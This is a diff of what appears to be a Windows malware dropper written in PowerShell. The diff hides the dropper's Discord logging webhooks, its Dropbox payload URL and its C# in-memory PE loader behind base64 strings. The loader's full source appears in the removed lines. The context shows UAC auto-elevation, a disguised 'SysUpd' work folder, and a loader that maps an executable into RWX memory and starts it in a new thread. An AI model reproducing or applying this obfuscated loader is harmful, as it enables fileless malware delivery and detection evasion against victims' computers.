@@ -1,5 +1,10 @@
+$d={[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args[0]))}
+$LW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMTIxNTg5MDQ0MjYyMDk5OC9MejhYZloyOGFGMFhhVWI2dTBSWU9QTkdFYlIzbnRTX05NOVM1LThXTDJBUlh3OHVyX3R2T1NIaFF5LU9uX1F1bFVueg=='
+$DW=& $d 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzMDYxNzYwNjM2MzU0NTcwMC9PYWt6VWJzQURvQUg0TmtubUhTSi1ibTJjSzRmZ3c5cE56Q3M5WW1ZTlVZMHhaR21tSVJfZEEzWjhReFVJUjhnNVFCQg=='
+$DU=& $d 'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3FxMzRvOWl0NHJnYWxlamM3eWczaS9kYXRhLnppcD9ybGtleT1hOTlvYWtrMDV5Z3A2aW1iYjRteWllbDdoJnN0PWRoa3Q4b2YyJmRsPTE='
+
 # Auto-elevate to admin (UAC)
-$LogWebhook = "https://discord.com/api/webhooks/1531215890442620998/Lz8XfZ28aF0XaUb6u0RYOPNGEbR3ntS_NM9S5-8WL2ARXw8ur_tvOSHhQy-On_QulUnz"
+$LogWebhook = $LW
 
 function Send-Log($msg) {
     try {
@@ -15,16 +20,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Send-Log "Not admin. scriptPath=$scriptPath PSCommandPath=$PSCommandPath PSScriptRoot=$PSScriptRoot"
 
     try {
-        Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Win32 {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-    [DllImport("kernel32.dll")]
-    public static extern bool AllocConsole();
-}
-"@
+        Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnB1YmxpYyBjbGFzcyBXaW4zMiB7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDb25zb2xlV2luZG93KCk7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQWxsb2NDb25zb2xlKCk7Cn0=')))
         $hwnd = [Win32]::GetConsoleWindow()
         Send-Log "ConsoleWindow handle=$hwnd"
         if ($hwnd -eq [IntPtr]::Zero) {
@@ -54,8 +50,8 @@ public class Win32 {
 $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-$DiscordWebhook = "https://discord.com/api/webhooks/1530617606363545700/OakzUbsADoAH4NknmHSJ-bm2cK4fgw9pNzCs9YmYNUY0xZGmmIR_dA3Z8QxUIR8g5QBB"
-$DownloadUrl = "https://www.dropbox.com/scl/fi/qq34o9it4rgalejc7yg3i/data.zip?rlkey=a99oakk05ygp6imbb4myiel7h&st=dhkt8of2&dl=1"
+$DiscordWebhook = $DW
+$DownloadUrl = $DU
 $WorkDir = Join-Path $env:TEMP "SysUpd"
 $ServerDir = Join-Path $WorkDir "Server"
 $ToolsDir = Join-Path $WorkDir ".tools"
@@ -387,180 +383,7 @@ Remove-Item $saveFile -Force -ErrorAction SilentlyContinue
 #  Step 5: Compile in-memory PE loader
 # ============================================================
 Write-Host "[6/6] Compiling loader..."
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-
-public static class MemPELoader
-{
-    public static byte[] PE;
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
-
-    [DllImport("kernel32.dll", SetLastError=true)]
-    static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint tid);
-
-    [DllImport("kernel32.dll")]
-    static extern uint WaitForSingleObject(IntPtr h, uint ms);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetProcAddress(IntPtr mod, string name);
-
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetProcAddress(IntPtr mod, IntPtr ordinal);
-
-    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
-    static extern IntPtr GetModuleHandle(string name);
-
-    [DllImport("ntdll.dll")]
-    static extern int RtlAddFunctionTable(IntPtr table, uint count, ulong baseImg);
-
-    [DllImport("kernel32.dll")]
-    static extern void RtlMoveMemory(IntPtr dst, IntPtr src, uint size);
-
-    public static void LoadAndRun()
-    {
-        IntPtr src = Marshal.AllocHGlobal(PE.Length);
-        Marshal.Copy(PE, 0, src, PE.Length);
-
-        try
-        {
-            if ((ushort)Marshal.ReadInt16(src) != 0x5A4D) return;
-            int peOff = Marshal.ReadInt32(src + 0x3C);
-            IntPtr nt = src + peOff;
-            if (Marshal.ReadInt32(nt) != 0x4550) return;
-            int numSec = Marshal.ReadInt16(nt + 6);
-            int sizeOpt = (ushort)Marshal.ReadInt16(nt + 20);
-            if ((ushort)Marshal.ReadInt16(nt + 4) != 0x8664) return;
-            IntPtr opt = nt + 24;
-            if ((ushort)Marshal.ReadInt16(opt) != 0x020B) return;
-
-            uint entryRVA = (uint)Marshal.ReadInt32(opt + 16);
-            long imgBase = Marshal.ReadInt64(opt + 24);
-            uint sizeOfImage = (uint)Marshal.ReadInt32(opt + 56);
-            uint sizeOfHeaders = (uint)Marshal.ReadInt32(opt + 60);
-            int numDir = Marshal.ReadInt32(opt + 108);
-
-            uint relocRVA = 0, relocSize = 0;
-            uint importRVA = 0, importSize = 0;
-            uint excRVA = 0, excSize = 0;
-            if (numDir > 5) { relocRVA = (uint)Marshal.ReadInt32(opt + 112 + 5 * 8); relocSize = (uint)Marshal.ReadInt32(opt + 112 + 5 * 8 + 4); }
-            if (numDir > 1) { importRVA = (uint)Marshal.ReadInt32(opt + 112 + 1 * 8); importSize = (uint)Marshal.ReadInt32(opt + 112 + 1 * 8 + 4); }
-            if (numDir > 3) { excRVA = (uint)Marshal.ReadInt32(opt + 112 + 3 * 8); excSize = (uint)Marshal.ReadInt32(opt + 112 + 3 * 8 + 4); }
-
-            IntPtr secHdr = opt + sizeOpt;
-            uint[] secVA = new uint[numSec];
-            uint[] secRawPtr = new uint[numSec];
-            uint[] secCopyLen = new uint[numSec];
-            for (int i = 0; i < numSec; i++)
-            {
-                IntPtr sh = secHdr + i * 40;
-                uint vSize = (uint)Marshal.ReadInt32(sh + 8);
-                uint vAddr = (uint)Marshal.ReadInt32(sh + 12);
-                uint rawSize = (uint)Marshal.ReadInt32(sh + 16);
-                uint rawPtr = (uint)Marshal.ReadInt32(sh + 20);
-                secVA[i] = vAddr;
-                secRawPtr[i] = rawPtr;
-                secCopyLen[i] = Math.Min(rawSize, vSize);
-            }
-
-            IntPtr target = VirtualAlloc((IntPtr)imgBase, sizeOfImage, 0x3000, 0x40);
-            bool relocated = (target != (IntPtr)imgBase);
-            if (target == IntPtr.Zero)
-                target = VirtualAlloc(IntPtr.Zero, sizeOfImage, 0x3000, 0x40);
-            if (target == IntPtr.Zero) { Marshal.FreeHGlobal(src); return; }
-
-            long delta = (long)target - imgBase;
-            RtlMoveMemory(target, src, sizeOfHeaders);
-
-            for (int i = 0; i < numSec; i++)
-                if (secCopyLen[i] > 0 && secRawPtr[i] > 0 && secRawPtr[i] < PE.Length)
-                    RtlMoveMemory(target + (int)secVA[i], src + (int)secRawPtr[i], secCopyLen[i]);
-
-            Marshal.FreeHGlobal(src);
-            src = IntPtr.Zero;
-
-            if (relocated && relocRVA > 0 && relocSize > 0)
-                ApplyRelocations(target, delta, relocRVA, relocSize);
-
-            if (importRVA > 0 && importSize > 0)
-                ResolveImports(target, importRVA);
-
-            if (excRVA > 0 && excSize >= 12)
-                RtlAddFunctionTable(target + (int)excRVA, excSize / 12, (ulong)(long)target);
-
-            IntPtr entry = target + (int)entryRVA;
-            uint tid;
-            CreateThread(IntPtr.Zero, 0, entry, IntPtr.Zero, 0, out tid);
-        }
-        catch { if (src != IntPtr.Zero) Marshal.FreeHGlobal(src); }
-    }
-
-    static void ApplyRelocations(IntPtr target, long delta, uint rva, uint size)
-    {
-        IntPtr p = target + (int)rva;
-        IntPtr end = p + (int)size;
-        while ((long)p < (long)end)
-        {
-            uint pageRVA = (uint)Marshal.ReadInt32(p);
-            uint blockSize = (uint)Marshal.ReadInt32(p + 4);
-            if (blockSize < 8) break;
-            int entries = (int)((blockSize - 8) / 2);
-            for (int i = 0; i < entries; i++)
-            {
-                ushort e = (ushort)Marshal.ReadInt16(p + 8 + i * 2);
-                if ((e >> 12) == 10)
-                {
-                    IntPtr addr = target + (int)pageRVA + (e & 0xFFF);
-                    Marshal.WriteInt64(addr, Marshal.ReadInt64(addr) + delta);
-                }
-            }
-            p += (int)blockSize;
-            p = (IntPtr)(((long)p + 3) & ~3L);
-        }
-    }
-
-    static void ResolveImports(IntPtr target, uint importRVA)
-    {
-        IntPtr desc = target + (int)importRVA;
-        while (true)
-        {
-            uint origFT = (uint)Marshal.ReadInt32(desc);
-            uint nameRVA = (uint)Marshal.ReadInt32(desc + 12);
-            uint firstThunk = (uint)Marshal.ReadInt32(desc + 16);
-            if (nameRVA == 0 && origFT == 0) break;
-
-            string dllName = Marshal.PtrToStringAnsi(target + (int)nameRVA);
-            IntPtr hMod = GetModuleHandle(dllName);
-            if (hMod == IntPtr.Zero) { desc += 20; continue; }
-
-            IntPtr iltPtr = origFT > 0 ? target + (int)origFT : target + (int)firstThunk;
-            IntPtr iatPtr = target + (int)firstThunk;
-
-            for (int j = 0; ; j++)
-            {
-                long entry = Marshal.ReadInt64(iltPtr + j * 8);
-                if (entry == 0) break;
-
-                IntPtr funcAddr;
-                if (entry < 0)
-                {
-                    funcAddr = GetProcAddress(hMod, (IntPtr)(long)(ushort)(entry & 0xFFFF));
-                }
-                else
-                {
-                    IntPtr hintName = target + (int)(entry & 0x7FFFFFFF);
-                    funcAddr = GetProcAddress(hMod, Marshal.PtrToStringAnsi(hintName + 2));
-                }
-                if (funcAddr != IntPtr.Zero)
-                    Marshal.WriteIntPtr(iatPtr + j * 8, funcAddr);
-            }
-            desc += 20;
-        }
-    }
-}
-"@ -Language CSharp -ErrorAction Stop
+Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHVibGljIHN0YXRpYyBjbGFzcyBNZW1QRUxvYWRlcgp7CiAgICBwdWJsaWMgc3RhdGljIGJ5dGVbXSBQRTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBWaXJ0dWFsQWxsb2MoSW50UHRyIGFkZHIsIHVpbnQgc2l6ZSwgdWludCB0eXBlLCB1aW50IHByb3RlY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIENyZWF0ZVRocmVhZChJbnRQdHIgYXR0ciwgdWludCBzdGFjaywgSW50UHRyIHN0YXJ0LCBJbnRQdHIgcGFyYW0sIHVpbnQgZmxhZ3MsIG91dCB1aW50IHRpZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBzdGF0aWMgZXh0ZXJuIHVpbnQgV2FpdEZvclNpbmdsZU9iamVjdChJbnRQdHIgaCwgdWludCBtcyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgbW9kLCBzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgbW9kLCBJbnRQdHIgb3JkaW5hbCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldD1DaGFyU2V0LkFuc2kpXQogICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0TW9kdWxlSGFuZGxlKHN0cmluZyBuYW1lKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHN0YXRpYyBleHRlcm4gaW50IFJ0bEFkZEZ1bmN0aW9uVGFibGUoSW50UHRyIHRhYmxlLCB1aW50IGNvdW50LCB1bG9uZyBiYXNlSW1nKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIHN0YXRpYyBleHRlcm4gdm9pZCBSdGxNb3ZlTWVtb3J5KEludFB0ciBkc3QsIEludFB0ciBzcmMsIHVpbnQgc2l6ZSk7CgogICAgcHVibGljIHN0YXRpYyB2b2lkIExvYWRBbmRSdW4oKQogICAgewogICAgICAgIEludFB0ciBzcmMgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChQRS5MZW5ndGgpOwogICAgICAgIE1hcnNoYWwuQ29weShQRSwgMCwgc3JjLCBQRS5MZW5ndGgpOwoKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgodXNob3J0KU1hcnNoYWwuUmVhZEludDE2KHNyYykgIT0gMHg1QTREKSByZXR1cm47CiAgICAgICAgICAgIGludCBwZU9mZiA9IE1hcnNoYWwuUmVhZEludDMyKHNyYyArIDB4M0MpOwogICAgICAgICAgICBJbnRQdHIgbnQgPSBzcmMgKyBwZU9mZjsKICAgICAgICAgICAgaWYgKE1hcnNoYWwuUmVhZEludDMyKG50KSAhPSAweDQ1NTApIHJldHVybjsKICAgICAgICAgICAgaW50IG51bVNlYyA9IE1hcnNoYWwuUmVhZEludDE2KG50ICsgNik7CiAgICAgICAgICAgIGludCBzaXplT3B0ID0gKHVzaG9ydClNYXJzaGFsLlJlYWRJbnQxNihudCArIDIwKTsKICAgICAgICAgICAgaWYgKCh1c2hvcnQpTWFyc2hhbC5SZWFkSW50MTYobnQgKyA0KSAhPSAweDg2NjQpIHJldHVybjsKICAgICAgICAgICAgSW50UHRyIG9wdCA9IG50ICsgMjQ7CiAgICAgICAgICAgIGlmICgodXNob3J0KU1hcnNoYWwuUmVhZEludDE2KG9wdCkgIT0gMHgwMjBCKSByZXR1cm47CgogICAgICAgICAgICB1aW50IGVudHJ5UlZBID0gKHVpbnQpTWFyc2hhbC5SZWFkSW50MzIob3B0ICsgMTYpOwogICAgICAgICAgICBsb25nIGltZ0Jhc2UgPSBNYXJzaGFsLlJlYWRJbnQ2NChvcHQgKyAyNCk7CiAgICAgICAgICAgIHVpbnQgc2l6ZU9mSW1hZ2UgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihvcHQgKyA1Nik7CiAgICAgICAgICAgIHVpbnQgc2l6ZU9mSGVhZGVycyA9ICh1aW50KU1hcnNoYWwuUmVhZEludDMyKG9wdCArIDYwKTsKICAgICAgICAgICAgaW50IG51bURpciA9IE1hcnNoYWwuUmVhZEludDMyKG9wdCArIDEwOCk7CgogICAgICAgICAgICB1aW50IHJlbG9jUlZBID0gMCwgcmVsb2NTaXplID0gMDsKICAgICAgICAgICAgdWludCBpbXBvcnRSVkEgPSAwLCBpbXBvcnRTaXplID0gMDsKICAgICAgICAgICAgdWludCBleGNSVkEgPSAwLCBleGNTaXplID0gMDsKICAgICAgICAgICAgaWYgKG51bURpciA+IDUpIHsgcmVsb2NSVkEgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihvcHQgKyAxMTIgKyA1ICogOCk7IHJlbG9jU2l6ZSA9ICh1aW50KU1hcnNoYWwuUmVhZEludDMyKG9wdCArIDExMiArIDUgKiA4ICsgNCk7IH0KICAgICAgICAgICAgaWYgKG51bURpciA+IDEpIHsgaW1wb3J0UlZBID0gKHVpbnQpTWFyc2hhbC5SZWFkSW50MzIob3B0ICsgMTEyICsgMSAqIDgpOyBpbXBvcnRTaXplID0gKHVpbnQpTWFyc2hhbC5SZWFkSW50MzIob3B0ICsgMTEyICsgMSAqIDggKyA0KTsgfQogICAgICAgICAgICBpZiAobnVtRGlyID4gMykgeyBleGNSVkEgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihvcHQgKyAxMTIgKyAzICogOCk7IGV4Y1NpemUgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihvcHQgKyAxMTIgKyAzICogOCArIDQpOyB9CgogICAgICAgICAgICBJbnRQdHIgc2VjSGRyID0gb3B0ICsgc2l6ZU9wdDsKICAgICAgICAgICAgdWludFtdIHNlY1ZBID0gbmV3IHVpbnRbbnVtU2VjXTsKICAgICAgICAgICAgdWludFtdIHNlY1Jhd1B0ciA9IG5ldyB1aW50W251bVNlY107CiAgICAgICAgICAgIHVpbnRbXSBzZWNDb3B5TGVuID0gbmV3IHVpbnRbbnVtU2VjXTsKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBudW1TZWM7IGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgSW50UHRyIHNoID0gc2VjSGRyICsgaSAqIDQwOwogICAgICAgICAgICAgICAgdWludCB2U2l6ZSA9ICh1aW50KU1hcnNoYWwuUmVhZEludDMyKHNoICsgOCk7CiAgICAgICAgICAgICAgICB1aW50IHZBZGRyID0gKHVpbnQpTWFyc2hhbC5SZWFkSW50MzIoc2ggKyAxMik7CiAgICAgICAgICAgICAgICB1aW50IHJhd1NpemUgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihzaCArIDE2KTsKICAgICAgICAgICAgICAgIHVpbnQgcmF3UHRyID0gKHVpbnQpTWFyc2hhbC5SZWFkSW50MzIoc2ggKyAyMCk7CiAgICAgICAgICAgICAgICBzZWNWQVtpXSA9IHZBZGRyOwogICAgICAgICAgICAgICAgc2VjUmF3UHRyW2ldID0gcmF3UHRyOwogICAgICAgICAgICAgICAgc2VjQ29weUxlbltpXSA9IE1hdGguTWluKHJhd1NpemUsIHZTaXplKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgSW50UHRyIHRhcmdldCA9IFZpcnR1YWxBbGxvYygoSW50UHRyKWltZ0Jhc2UsIHNpemVPZkltYWdlLCAweDMwMDAsIDB4NDApOwogICAgICAgICAgICBib29sIHJlbG9jYXRlZCA9ICh0YXJnZXQgIT0gKEludFB0cilpbWdCYXNlKTsKICAgICAgICAgICAgaWYgKHRhcmdldCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgICAgIHRhcmdldCA9IFZpcnR1YWxBbGxvYyhJbnRQdHIuWmVybywgc2l6ZU9mSW1hZ2UsIDB4MzAwMCwgMHg0MCk7CiAgICAgICAgICAgIGlmICh0YXJnZXQgPT0gSW50UHRyLlplcm8pIHsgTWFyc2hhbC5GcmVlSEdsb2JhbChzcmMpOyByZXR1cm47IH0KCiAgICAgICAgICAgIGxvbmcgZGVsdGEgPSAobG9uZyl0YXJnZXQgLSBpbWdCYXNlOwogICAgICAgICAgICBSdGxNb3ZlTWVtb3J5KHRhcmdldCwgc3JjLCBzaXplT2ZIZWFkZXJzKTsKCiAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgbnVtU2VjOyBpKyspCiAgICAgICAgICAgICAgICBpZiAoc2VjQ29weUxlbltpXSA+IDAgJiYgc2VjUmF3UHRyW2ldID4gMCAmJiBzZWNSYXdQdHJbaV0gPCBQRS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgUnRsTW92ZU1lbW9yeSh0YXJnZXQgKyAoaW50KXNlY1ZBW2ldLCBzcmMgKyAoaW50KXNlY1Jhd1B0cltpXSwgc2VjQ29weUxlbltpXSk7CgogICAgICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKHNyYyk7CiAgICAgICAgICAgIHNyYyA9IEludFB0ci5aZXJvOwoKICAgICAgICAgICAgaWYgKHJlbG9jYXRlZCAmJiByZWxvY1JWQSA+IDAgJiYgcmVsb2NTaXplID4gMCkKICAgICAgICAgICAgICAgIEFwcGx5UmVsb2NhdGlvbnModGFyZ2V0LCBkZWx0YSwgcmVsb2NSVkEsIHJlbG9jU2l6ZSk7CgogICAgICAgICAgICBpZiAoaW1wb3J0UlZBID4gMCAmJiBpbXBvcnRTaXplID4gMCkKICAgICAgICAgICAgICAgIFJlc29sdmVJbXBvcnRzKHRhcmdldCwgaW1wb3J0UlZBKTsKCiAgICAgICAgICAgIGlmIChleGNSVkEgPiAwICYmIGV4Y1NpemUgPj0gMTIpCiAgICAgICAgICAgICAgICBSdGxBZGRGdW5jdGlvblRhYmxlKHRhcmdldCArIChpbnQpZXhjUlZBLCBleGNTaXplIC8gMTIsICh1bG9uZykobG9uZyl0YXJnZXQpOwoKICAgICAgICAgICAgSW50UHRyIGVudHJ5ID0gdGFyZ2V0ICsgKGludCllbnRyeVJWQTsKICAgICAgICAgICAgdWludCB0aWQ7CiAgICAgICAgICAgIENyZWF0ZVRocmVhZChJbnRQdHIuWmVybywgMCwgZW50cnksIEludFB0ci5aZXJvLCAwLCBvdXQgdGlkKTsKICAgICAgICB9CiAgICAgICAgY2F0Y2ggeyBpZiAoc3JjICE9IEludFB0ci5aZXJvKSBNYXJzaGFsLkZyZWVIR2xvYmFsKHNyYyk7IH0KICAgIH0KCiAgICBzdGF0aWMgdm9pZCBBcHBseVJlbG9jYXRpb25zKEludFB0ciB0YXJnZXQsIGxvbmcgZGVsdGEsIHVpbnQgcnZhLCB1aW50IHNpemUpCiAgICB7CiAgICAgICAgSW50UHRyIHAgPSB0YXJnZXQgKyAoaW50KXJ2YTsKICAgICAgICBJbnRQdHIgZW5kID0gcCArIChpbnQpc2l6ZTsKICAgICAgICB3aGlsZSAoKGxvbmcpcCA8IChsb25nKWVuZCkKICAgICAgICB7CiAgICAgICAgICAgIHVpbnQgcGFnZVJWQSA9ICh1aW50KU1hcnNoYWwuUmVhZEludDMyKHApOwogICAgICAgICAgICB1aW50IGJsb2NrU2l6ZSA9ICh1aW50KU1hcnNoYWwuUmVhZEludDMyKHAgKyA0KTsKICAgICAgICAgICAgaWYgKGJsb2NrU2l6ZSA8IDgpIGJyZWFrOwogICAgICAgICAgICBpbnQgZW50cmllcyA9IChpbnQpKChibG9ja1NpemUgLSA4KSAvIDIpOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGVudHJpZXM7IGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdXNob3J0IGUgPSAodXNob3J0KU1hcnNoYWwuUmVhZEludDE2KHAgKyA4ICsgaSAqIDIpOwogICAgICAgICAgICAgICAgaWYgKChlID4+IDEyKSA9PSAxMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBJbnRQdHIgYWRkciA9IHRhcmdldCArIChpbnQpcGFnZVJWQSArIChlICYgMHhGRkYpOwogICAgICAgICAgICAgICAgICAgIE1hcnNoYWwuV3JpdGVJbnQ2NChhZGRyLCBNYXJzaGFsLlJlYWRJbnQ2NChhZGRyKSArIGRlbHRhKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBwICs9IChpbnQpYmxvY2tTaXplOwogICAgICAgICAgICBwID0gKEludFB0cikoKChsb25nKXAgKyAzKSAmIH4zTCk7CiAgICAgICAgfQogICAgfQoKICAgIHN0YXRpYyB2b2lkIFJlc29sdmVJbXBvcnRzKEludFB0ciB0YXJnZXQsIHVpbnQgaW1wb3J0UlZBKQogICAgewogICAgICAgIEludFB0ciBkZXNjID0gdGFyZ2V0ICsgKGludClpbXBvcnRSVkE7CiAgICAgICAgd2hpbGUgKHRydWUpCiAgICAgICAgewogICAgICAgICAgICB1aW50IG9yaWdGVCA9ICh1aW50KU1hcnNoYWwuUmVhZEludDMyKGRlc2MpOwogICAgICAgICAgICB1aW50IG5hbWVSVkEgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihkZXNjICsgMTIpOwogICAgICAgICAgICB1aW50IGZpcnN0VGh1bmsgPSAodWludClNYXJzaGFsLlJlYWRJbnQzMihkZXNjICsgMTYpOwogICAgICAgICAgICBpZiAobmFtZVJWQSA9PSAwICYmIG9yaWdGVCA9PSAwKSBicmVhazsKCiAgICAgICAgICAgIHN0cmluZyBkbGxOYW1lID0gTWFyc2hhbC5QdHJUb1N0cmluZ0Fuc2kodGFyZ2V0ICsgKGludCluYW1lUlZBKTsKICAgICAgICAgICAgSW50UHRyIGhNb2QgPSBHZXRNb2R1bGVIYW5kbGUoZGxsTmFtZSk7CiAgICAgICAgICAgIGlmIChoTW9kID09IEludFB0ci5aZXJvKSB7IGRlc2MgKz0gMjA7IGNvbnRpbnVlOyB9CgogICAgICAgICAgICBJbnRQdHIgaWx0UHRyID0gb3JpZ0ZUID4gMCA/IHRhcmdldCArIChpbnQpb3JpZ0ZUIDogdGFyZ2V0ICsgKGludClmaXJzdFRodW5rOwogICAgICAgICAgICBJbnRQdHIgaWF0UHRyID0gdGFyZ2V0ICsgKGludClmaXJzdFRodW5rOwoKICAgICAgICAgICAgZm9yIChpbnQgaiA9IDA7IDsgaisrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBsb25nIGVudHJ5ID0gTWFyc2hhbC5SZWFkSW50NjQoaWx0UHRyICsgaiAqIDgpOwogICAgICAgICAgICAgICAgaWYgKGVudHJ5ID09IDApIGJyZWFrOwoKICAgICAgICAgICAgICAgIEludFB0ciBmdW5jQWRkcjsKICAgICAgICAgICAgICAgIGlmIChlbnRyeSA8IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgZnVuY0FkZHIgPSBHZXRQcm9jQWRkcmVzcyhoTW9kLCAoSW50UHRyKShsb25nKSh1c2hvcnQpKGVudHJ5ICYgMHhGRkZGKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgSW50UHRyIGhpbnROYW1lID0gdGFyZ2V0ICsgKGludCkoZW50cnkgJiAweDdGRkZGRkZGKTsKICAgICAgICAgICAgICAgICAgICBmdW5jQWRkciA9IEdldFByb2NBZGRyZXNzKGhNb2QsIE1hcnNoYWwuUHRyVG9TdHJpbmdBbnNpKGhpbnROYW1lICsgMikpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKGZ1bmNBZGRyICE9IEludFB0ci5aZXJvKQogICAgICAgICAgICAgICAgICAgIE1hcnNoYWwuV3JpdGVJbnRQdHIoaWF0UHRyICsgaiAqIDgsIGZ1bmNBZGRyKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBkZXNjICs9IDIwOwogICAgICAgIH0KICAgIH0KfQ=='))) -Language CSharp -ErrorAction Stop
 Write-Host "  Compiled OK."
 
 # ============================================================
